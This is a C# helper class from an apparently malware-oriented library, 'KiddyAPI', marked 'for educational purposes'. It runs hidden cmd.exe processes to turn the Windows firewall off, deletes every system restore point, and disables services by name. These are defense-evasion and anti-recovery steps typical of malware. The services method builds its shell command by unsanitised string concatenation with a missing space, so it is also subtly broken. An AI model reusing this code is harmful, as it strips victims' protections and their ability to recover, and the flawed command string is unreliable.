﻿/////////////////////////////////////////////////////////
//// Developer : Whiro
//// For for educational purposes
//////////////////////////////////////////////////////////
using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;

namespace KiddyAPI.Protect
{
    /// <summary>
    /// Class for executing CMD command
    /// </summary>
   public class ShellHelper
    {
        [DllImport("Srclient.dll")]
        private static extern int SRRemoveRestorePoint(int index);
        /// <summary>
        /// Enabled/Disabled Firewall
        /// </summary>
        /// <param name="enabled">true = Firewall ON, false - OFF</param>
        public static void Firewall(bool enabled)
        {
            if (enabled)
            {

                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = "cmd.exe",
                    Arguments = "/C NetSh Advfirewall set allprofiles state on"
                };
                process.StartInfo = startInfo;
                process.Start();
            }
            else
            {
                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = "cmd.exe",
                    Arguments = "/C NetSh Advfirewall set allprofiles state off"
                };
                process.StartInfo = startInfo;
                process.Start();
            }
        }
        /// <summary>
        /// Delete system restore point
        /// </summary>
        public static void SRDelete()
        {
            //Делаем запрос на получение коллекции
            var objClass = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
            ManagementObjectCollection objCol = objClass.GetInstances();
            StringBuilder result = new StringBuilder();
            //Удаляем
            foreach (var item in objCol)
            {
                result.AppendLine((string)item["description"] + Convert.ToChar(9) + ((uint)item["sequencenumber"]));
                SRRemoveRestorePoint(int.Parse(item["sequencenumber"].ToString()));
            }
        }
        /// <summary>
        /// Start/Stop Services
        /// </summary>
        /// <param name="name">Services name</param>
        /// <param name="enable">True - On, False - Off</param>
        public static void Services(string name, bool enable)
        {
            if (enable)
            {

                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C sc config " + name + "start= enabled";
                process.StartInfo = startInfo;
                process.Start();
            }
            else
            {

                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C sc config " + name + "start= disabled";
                process.StartInfo = startInfo;
                process.Start();
            }
        }
    }
}
